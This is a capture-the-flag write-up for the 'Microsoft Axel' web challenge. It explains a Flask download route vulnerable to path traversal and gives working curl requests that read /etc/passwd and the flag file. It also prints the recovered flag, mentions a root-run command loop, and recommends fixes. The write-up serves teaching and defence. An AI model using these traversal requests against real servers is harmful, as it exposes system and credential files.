# Microsoft Axel - upCTF Web Challenge Writeup

## Challenge Info
- Name: `Microsoft Axel`
- Authors: `0xacb & castilho`
- Category: Web
- Objective: Retrieve the flag in format `upCTF{...}`
- Prompt summary: "Upload anything to download later, with our latest download everything service."

## Executive Summary
The challenge is vulnerable to **path traversal / local file read** in the download route:
- Endpoint: `GET /download/<path:filename>`
- Bug: User-controlled `filename` is concatenated to `/app/files` and passed directly to `send_file()` without canonicalization or path restriction.
- Impact: Arbitrary readable files on the filesystem can be downloaded, including `/flag.txt` when URL-encoding is used.

Final exploit request:
```bash
curl -s "http://46.225.117.62:30014/download/..%2F..%2Fflag.txt"
```

Recovered flag:
```text
upCTF{4x3l_0d4y_w1th4_tw1st-D4eH1LN0da079878}
```

## Source Code Analysis
### 1. Vulnerable Route
From `app.py`:

```python
@app.get("/download/<path:filename>")
def download(filename: str):
    target = FILES_DIR / filename
    return send_file(target, as_attachment=True)
```

Why this is vulnerable:
- `FILES_DIR` points to `/app/files`.
- `filename` accepts path separators due to `<path:...>`.
- No validation like `safe_join`, `resolve` bounds check, or reject `..`.
- `send_file` attempts to open whatever resulting path resolves to.

So `filename=../../etc/passwd` becomes `/app/files/../../etc/passwd` and escapes the intended directory.

### 2. Route Behavior Nuance
Two traversal forms were tested:
- `/download/../../flag.txt` -> `404` (framework/proxy normalization affects route matching)
- `/download/..%2F..%2Fflag.txt` -> works (encoded slash traversal reaches backend logic)

For this target, **URL-encoded traversal was required**.

## Exploitation Steps
### Step 1: Confirm Service
```bash
curl -i "http://46.225.117.62:30014/"
```
Expected: `200 OK` and challenge homepage.

### Step 2: Validate Traversal Primitive
Optional sanity check:
```bash
curl -s "http://46.225.117.62:30014/download/..%2F..%2Fetc%2Fpasswd"
```
If output resembles `/etc/passwd`, traversal is confirmed.

### Step 3: Read Flag File
```bash
curl -s -i "http://46.225.117.62:30014/download/..%2F..%2Fflag.txt"
```
Observed response (key parts):
- `HTTP/1.1 200 OK`
- `Content-Disposition: attachment; filename=flag.txt`
- Body contained the flag value.

## Flag
```text
upCTF{4x3l_0d4y_w1th4_tw1st-D4eH1LN0da079878}
```

## Why It Works
- The app assumes `FILES_DIR / filename` keeps requests inside `/app/files`.
- Path traversal components (`../`) are interpreted by the filesystem when opening the file.
- No boundary check prevents escaping into parent directories.

## Security Fix Recommendations
Use one of these defensive patterns:

1. `send_from_directory` with strict filename policy:
```python
from flask import send_from_directory

@app.get("/download/<path:filename>")
def download(filename: str):
    return send_from_directory(FILES_DIR, filename, as_attachment=True)
```

2. Canonical path check:
```python
target = (FILES_DIR / filename).resolve()
if not str(target).startswith(str(FILES_DIR.resolve()) + os.sep):
    abort(403)
return send_file(target, as_attachment=True)
```

3. Reject dangerous names early:
- Deny `..`, leading `/`, and null bytes.
- Consider allow-listing stored filenames from internal metadata instead of accepting arbitrary path input.

## Additional Notes
- A root-side background command loop exists in `entrypoint.sh` that executes `/tmp/.cmd` if present.
- In this solve path, privilege escalation was unnecessary because direct traversal already exposed `/flag.txt`.
- Main takeaway: path traversal in download endpoints can completely bypass intended storage boundaries.
